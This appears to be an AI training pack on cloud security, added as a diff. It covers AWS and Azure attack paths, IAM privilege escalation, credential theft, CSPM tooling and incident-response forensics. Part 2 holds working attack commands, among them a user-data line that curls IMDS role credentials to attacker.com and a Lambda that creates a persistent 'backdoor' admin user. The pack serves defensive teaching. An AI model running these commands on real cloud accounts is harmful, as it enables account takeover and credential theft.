@@ -1,0 +1,420 @@
+================================================================================
+TITAN AI — TRAINING PACK 039: ADVANCED CLOUD SECURITY
+AWS/AZURE/GCP ATTACK PATHS, IAM PRIVILEGE ESCALATION, CSPM, CLOUD FORENSICS
+================================================================================
+
+================================================================================
+PART 1: CLOUD ATTACK SURFACE OVERVIEW
+================================================================================
+
+--- THE CLOUD THREAT MODEL ---
+
+SHARED RESPONSIBILITY MODEL:
+  Cloud provider: Physical, hypervisor, global network, service availability.
+  Customer: Identity, data, OS configuration (EC2), network config, encryption.
+  
+  Common mistake: "Cloud is secure — it's AWS's problem."
+  Reality: 99% of cloud breaches are customer misconfiguration, not provider breaches.
+  
+  Verizon DBIR 2024: Misconfiguration is the #1 cause of cloud data breaches.
+  
+TOP CLOUD BREACH CAUSES (with real examples):
+  Exposed S3 bucket: Capital One (2019), Facebook (2019), tens of thousands of others.
+  Stolen credentials via SSRF: Capital One — SSRF → IMDS → IAM role creds → S3.
+  Overly permissive IAM: Common root cause in ransomware targeting cloud.
+  Exposed secrets in code: GitHub commit with AWS keys → crypto mining in hours.
+  Insecure security groups: RDP/SSH open to 0.0.0.0/0 → brute force.
+  Supply chain: Malicious npm package → exfiltrates env vars containing cloud creds.
+  Terraform state files: S3 bucket with unencrypted tfstate → all infra + secrets exposed.
+
+--- ATTACKER KILL CHAIN IN AWS ---
+
+Typical attack progression:
+  1. Initial access: Exposed credentials (GitHub, env file), SSRF on web app,
+     phishing → AWS console login, supply chain.
+  2. Discovery: Enumerate IAM permissions, list S3 buckets, list running EC2.
+  3. Privilege escalation: Find IAM privilege escalation path to Administrator.
+  4. Lateral movement: Assume other roles, access other accounts, cross-service pivots.
+  5. Data exfiltration: S3 sync, RDS snapshot export, Secrets Manager dump.
+  6. Persistence: New IAM user, new access keys, Lambda backdoor, CloudFormation.
+  7. Impact: Ransomware (delete backups then encrypt), cryptomining, DDoS.
+
+================================================================================
+PART 2: AWS IAM PRIVILEGE ESCALATION
+================================================================================
+
+--- PERMISSION ENUMERATION ---
+
+TOOLS:
+  enumerate-iam: Brute-force all API calls to find what permissions a key has.
+    git clone https://github.com/andresriancho/enumerate-iam
+    python enumerate-iam.py --access-key AKI... --secret-key ... --region us-east-1
+    # Tries 5000+ API calls. Returns: All APIs that respond with success.
+    
+  aws-whoami: Who is this key?
+    aws sts get-caller-identity
+    # Returns: Account ID, ARN of user/role, UserId
+    
+  Pacu (AWS exploitation framework):
+    import_keys
+    run iam__enum_permissions  # Enumerate all permissions
+    run iam__privesc_scan       # Scan for privilege escalation paths
+
+MANUAL ENUMERATION:
+  # What policies are attached to this user?
+  aws iam list-attached-user-policies --user-name current-user
+  aws iam list-user-policies --user-name current-user  # Inline policies
+  
+  # What groups is this user in?
+  aws iam list-groups-for-user --user-name current-user
+  
+  # Get the policy document:
+  aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/MyPolicy \
+    --version-id v1
+  
+  # What roles can I assume?
+  aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | contains("arn:aws:iam::123456789012:user/current-user"))'
+
+--- PRIVILEGE ESCALATION TECHNIQUES (BISHOP FOX RESEARCH) ---
+
+1. iam:CreatePolicyVersion:
+  Can create new version of existing policy → set it as default → add AdministratorAccess.
+  
+  aws iam create-policy-version \
+    --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
+    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
+    --set-as-default
+  
+  Now: TargetPolicy grants full admin. Any user/role with TargetPolicy attached = admin.
+
+2. iam:AttachUserPolicy:
+  Attach any policy to any user (including AdministratorAccess).
+  
+  aws iam attach-user-policy \
+    --user-name target-user \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+3. iam:PassRole + ec2:RunInstances:
+  Create EC2 instance → Pass a more privileged role to it → Access instance → Steal creds.
+  
+  aws ec2 run-instances \
+    --image-id ami-12345678 \
+    --instance-type t2.micro \
+    --iam-instance-profile Name=AdminRole \
+    --user-data "curl 169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds && curl http://attacker.com -d @/tmp/creds"
+  
+  Within minutes: EC2 requests IMDS credentials. User data exfiltrates them. Full AdminRole access.
+
+4. lambda:CreateFunction + iam:PassRole:
+  Create Lambda with privileged role → Invoke Lambda → Lambda executes with those permissions.
+  
+  # Lambda code (exfiltrate privileged role creds):
+  import boto3, requests
+  def handler(event, context):
+      sts = boto3.client('sts')
+      creds = sts.get_caller_identity()  # Running as privileged role
+      # Do anything: Create IAM user, list all secrets, etc.
+      iam = boto3.client('iam')
+      iam.create_user(UserName='backdoor')
+      iam.attach_user_policy(UserName='backdoor',
+                              PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+      iam.create_access_key(UserName='backdoor')  # Persistent access!
+
+5. sts:AssumeRole with misconfigured trust:
+  Role trust policy allows: "Principal": "*" (anyone can assume).
+  Or: External attacker's account in trust policy.
+  
+  aws sts assume-role \
+    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/AdminRole \
+    --role-session-name attack
+  # Returns: Temporary credentials with AdminRole permissions.
+
+6. iam:UpdateAssumeRolePolicy:
+  Modify role's trust policy to allow your principal to assume it.
+  
+  aws iam update-assume-role-policy \
+    --role-name PrivilegedRole \
+    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::123456789012:user/my-user"},"Action":"sts:AssumeRole"}]}'
+  
+  Then assume the role: sts:AssumeRole PrivilegedRole → Admin access.
+
+AUTOMATED DETECTION: PMapper (Principal Mapper):
+  Builds graph of all IAM relationships in account.
+  Finds: All privilege escalation paths from any principal to admin.
+  
+  pmapper graph create
+  pmapper analysis --output all_privesc_paths.json
+  pmapper visualize  # Web-based graph
+
+================================================================================
+PART 3: CLOUD ATTACK TECHNIQUES
+================================================================================
+
+--- AWS CREDENTIAL THEFT PATHS ---
+
+1. IMDS (Instance Metadata Service):
+  Every EC2 has access to: http://169.254.169.254/latest/meta-data/
+  If instance has IAM role: Credentials accessible at:
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+  
+  Returns: AccessKeyId, SecretAccessKey, Token, Expiration.
+  These are: Fully functional temporary credentials with the role's permissions.
+  
+  Protect with IMDSv2:
+  IMDSv2: Requires PUT request to get session token, then GET with session token.
+  SSRF: Cannot perform PUT + GET chain in typical SSRF scenarios.
+  Enforce: --metadata-options "HttpTokens=required" on EC2.
+  Block: Open metadata endpoint at EC2 level + network level.
+
+2. Lambda environment variables:
+  Lambda functions often store secrets in env vars.
+  If attacker can invoke Lambda or read its config:
+  
+  aws lambda get-function-configuration --function-name target-function
+  # Returns: Environment variables in plaintext (if not encrypted with customer KMS key)
+  
+  Protect: Use Secrets Manager. Reference ARN in Lambda, not value.
+
+3. Secrets Manager enumeration:
+  List all secrets (if iam:ListSecrets allowed):
+  aws secretsmanager list-secrets
+  
+  Get each secret:
+  aws secretsmanager get-secret-value --secret-id prod/db/password
+  # Dumps all secrets. Database passwords, API keys, certificates.
+  
+  Protect: Deny secretsmanager:GetSecretValue for every role except those that need specific secrets.
+  Resource-based: Allow: arn:aws:secretsmanager:*:*:secret:app/payments/* (not *)
+
+4. CloudTrail for attacker intel:
+  List recent API activity: Reveals what services are in use.
+  
+  aws cloudtrail lookup-events \
+    --lookup-attributes AttributeKey=EventName,AttributeValue=CreateBucket
+  # Shows: All S3 bucket creations. Find new buckets. Check if public.
+
+--- AZURE ATTACK TECHNIQUES ---
+
+AZURE AD PRIVILEGE ESCALATION:
+
+Service Principal credential theft:
+  Service principals: Non-human identities. Have client ID + secret or certificate.
+  Common places to steal:
+  - .env files in code repos
+  - Azure App Service environment variables
+  - CI/CD pipeline variables
+  - Terraform state files
+  
+  Once you have client_id + client_secret:
+  az login --service-principal -u <client_id> -p <secret> --tenant <tenant_id>
+
+Managed Identity exploitation:
+  Azure equivalent of AWS EC2 instance roles.
+  VM with Managed Identity → IMDS endpoint available:
+  
+  curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+    -H "Metadata: true"
+  # Returns: access_token for Azure management API
+  
+  # Use token to list subscriptions, resources, secrets:
+  az account list --access-token TOKEN
+  az keyvault secret list --vault-name prod-keyvault
+
+Azure AD consent abuse:
+  App registration with delegated permissions → User grants consent.
+  If admin consent: App gets permissions for ALL users in tenant.
+  Attack: Malicious OAuth app → "Grant admin consent" → Full tenant-level permissions.
+  
+  Detection: Monitor applications granted admin consent. Alert on new app registrations.
+
+--- CROSS-ACCOUNT LATERAL MOVEMENT ---
+
+AWS ORGANIZATIONS ABUSE:
+  In multi-account AWS environment: Root account often has OrganizationAccountAccessRole.
+  This role: Can be assumed from management account to any member account.
+  
+  If attacker compromises management account:
+  aws sts assume-role \
+    --role-arn arn:aws:iam::<MEMBER_ACCOUNT_ID>:role/OrganizationAccountAccessRole \
+    --role-session-name attack
+  # Admin access to ALL member accounts.
+  # 10 accounts? Assumed 10 times → Admin everywhere.
+
+SERVICE CONTROL POLICIES (SCPs) — DEFENSE:
+  SCPs: Guardrails on what ANY account in organization can do.
+  Even if account-level admin: SCPs at OU/root level can restrict.
+  
+  Critical SCP: Prevent disabling CloudTrail:
+  {
+    "Effect": "Deny",
+    "Action": [
+      "cloudtrail:DeleteTrail",
+      "cloudtrail:StopLogging",
+      "cloudtrail:PutEventSelectors"
+    ],
+    "Resource": "*"
+  }
+  
+  Even if attacker achieves admin: Cannot turn off logging. All actions logged.
+  
+  Critical SCP: Prevent root account usage:
+  {
+    "Effect": "Deny",
+    "Action": "*",
+    "Resource": "*",
+    "Condition": {
+      "StringLike": {"aws:PrincipalArn": "*:root"}
+    }
+  }
+  
+  Forces IAM users/roles. Root cannot be used for day-to-day.
+
+================================================================================
+PART 4: CLOUD SECURITY POSTURE MANAGEMENT (CSPM)
+================================================================================
+
+--- CSPM FUNDAMENTALS ---
+
+CSPM: Continuously assess cloud configuration against security benchmarks.
+Finds: Misconfigured S3 buckets, overly permissive security groups, missing encryption.
+
+CIS AWS FOUNDATIONS BENCHMARK — KEY CONTROLS:
+
+IDENTITY:
+  1.1: Do not use root account for daily operations. Alert on root usage (CIS 1.1).
+  1.4: MFA on root account.
+  1.5: MFA on all IAM users with console access.
+  1.7: No active root access keys.
+  1.14: Ensure hardware MFA for root account.
+  1.16: No full admin policies attached directly to users (only via groups/roles).
+  1.20: Support for AWS Organizations.
+
+LOGGING:
+  2.1: CloudTrail enabled in all regions.
+  2.2: CloudTrail log validation enabled.
+  2.3: Ensure bucket hosting CloudTrail logs not publicly accessible.
+  2.4: CloudTrail integrated with CloudWatch Logs.
+  2.5: AWS Config enabled.
+  2.7: CloudTrail logs encrypted at rest with KMS.
+
+NETWORKING:
+  5.1: No network ACLs allow unrestricted ingress on port 22.
+  5.2: No security groups with port 3389 open to 0.0.0.0/0.
+  5.3: No default security group allows all inbound/outbound.
+  5.4: VPC flow logging enabled in all VPCs.
+
+CSPM TOOLS:
+  
+Prowler (open-source):
+  Runs all CIS checks against AWS account.
+  
+  pip install prowler
+  prowler aws --compliance cis_level1_aws  # Run CIS Level 1
+  prowler aws --compliance cis_level2_aws  # Level 2 (more checks)
+  prowler aws -S  # Save report
+  # Output: Pass/fail for each control. Remediation guidance.
+
+ScoutSuite (open-source, multi-cloud):
+  python3 scout.py aws --report-name scout-report
+  # Web UI: Visual report. Color-coded findings by severity.
+  # Covers: AWS, Azure, GCP, OCI, Alibaba Cloud.
+
+Prisma Cloud / Wiz / Lacework (commercial CSPM):
+  Continuous monitoring. Connect to AWS API. Assess 24/7.
+  Wiz differentiator: Graph-based. Shows attack paths across misconfigs.
+  "This S3 bucket is publicly accessible AND contains database credentials AND those creds
+   have permissions to delete RDS snapshots" → Shows the full risk path, not just individual findings.
+
+================================================================================
+PART 5: CLOUD INCIDENT RESPONSE AND FORENSICS
+================================================================================
+
+--- AWS IR PLAYBOOK ---
+
+INITIAL TRIAGE (first 30 minutes):
+
+Step 1: Identify scope
+  aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=<suspect>
+  # All API calls by suspected compromised user/role in last 90 days.
+  
+  aws cloudtrail lookup-events \
+    --start-time $(date -d '24 hours ago' -u +"%Y-%m-%dT%H:%M:%SZ") \
+    --lookup-attributes AttributeKey=EventSource,AttributeValue=iam.amazonaws.com
+  # All IAM changes in last 24 hours.
+
+Step 2: Contain compromised credentials immediately
+  aws iam update-access-key --access-key-id AKI... --status Inactive
+  # Disable key without deleting (preserve evidence, can re-enable if false positive).
+  
+  aws iam attach-user-policy --user-name compromised-user \
+    --policy-arn arn:aws:iam::aws:policy/AWSDenyAll
+  # Block ALL actions. No access. Emergency isolation.
+
+Step 3: Preserve evidence
+  # Export CloudTrail logs before attacker can delete them (if they haven't already):
+  aws s3 sync s3://your-cloudtrail-bucket/AWSLogs/ /forensics/cloudtrail/
+  
+  # Snapshot EBS volumes of compromised EC2 (don't stop instance — memory evidence):
+  aws ec2 create-snapshot --volume-id vol-12345678 --description "forensic-$(date +%Y%m%d)"
+
+Step 4: Determine initial access
+  Look for:
+  - First time key was used from new IP/region: Geographic anomaly.
+  - API calls within seconds of each other (automation = attacker script).
+  - GetSecretValue on many secrets in rapid succession.
+  - CreateUser or CreateAccessKey after credential theft.
+  - iam:CreateLoginProfile (create web console access from programmatic key).
+
+CLOUD FORENSIC TOOLS:
+
+aws-ir: Automated AWS incident response tool.
+  Isolates compromised instances. Creates forensic snapshots. Generates timeline.
+  aws-ir run --compromised-host-ip 10.0.0.50
+
+Athena queries against CloudTrail:
+  # All API calls from non-approved regions:
+  SELECT eventtime, eventname, useridentity.arn, awsregion, sourceipaddress
+  FROM cloudtrail_logs
+  WHERE awsregion NOT IN ('us-east-1', 'us-west-2')
+    AND eventtime > '2025-01-01'
+  ORDER BY eventtime DESC;
+  
+  # All root account activity:
+  SELECT eventtime, eventname, sourceipaddress, useridentity.type
+  FROM cloudtrail_logs
+  WHERE useridentity.type = 'Root'
+  ORDER BY eventtime DESC;
+  
+  # New IAM users or keys created:
+  SELECT eventtime, eventname, useridentity.arn, requestparameters
+  FROM cloudtrail_logs
+  WHERE eventname IN ('CreateUser', 'CreateAccessKey', 'CreateLoginProfile',
+                      'AttachUserPolicy', 'PutUserPolicy')
+  ORDER BY eventtime DESC;
+
+DETECTIVE GUARDUTY FINDINGS (AWS native threat detection):
+  GuardDuty: Analyzes CloudTrail, VPC Flow Logs, DNS logs automatically.
+  
+  Key findings to watch:
+  UnauthorizedAccess:IAMUser/MaliciousIPCaller: API calls from known malicious IP.
+  PrivilegeEscalation:IAMUser/AdministrativePermissions: Suspected privilege escalation.
+  Persistence:IAMUser/UserPermissions: User gaining/modifying permissions.
+  Recon:IAMUser/MaliciousIPCaller: Reconnaissance from malicious IP.
+  CryptoCurrency:EC2/BitcoinTool.B: EC2 communicating with mining pool.
+  Exfiltration:S3/MaliciousIPCaller: S3 data accessed from malicious IP.
+  
+  GuardDuty → EventBridge rule → Lambda → PagerDuty/Slack alert → SOC response.
+  
+  Mean time to detect GuardDuty: Minutes vs. median 197 days without tooling.
+
+================================================================================
+END OF PACK 039: ADVANCED CLOUD SECURITY
+Total: Cloud threat model (shared responsibility, top breach causes, AWS kill chain),
+IAM privilege escalation (6 techniques: CreatePolicyVersion/AttachUserPolicy/
+PassRole+RunInstances/Lambda backdoor/AssumeRole misconfiguration/UpdateAssumeRolePolicy
+with commands), credential theft (IMDS/Lambda env/Secrets Manager/CloudTrail abuse),
+Azure attacks (service principal theft, Managed Identity IMDS, consent abuse),
+cross-account lateral movement with SCPs defense, CSPM (Prowler/ScoutSuite/Wiz with
+CIS benchmark controls), AWS IR playbook (contain/preserve/Athena forensic queries),
+GuardDuty key findings catalog.
+================================================================================
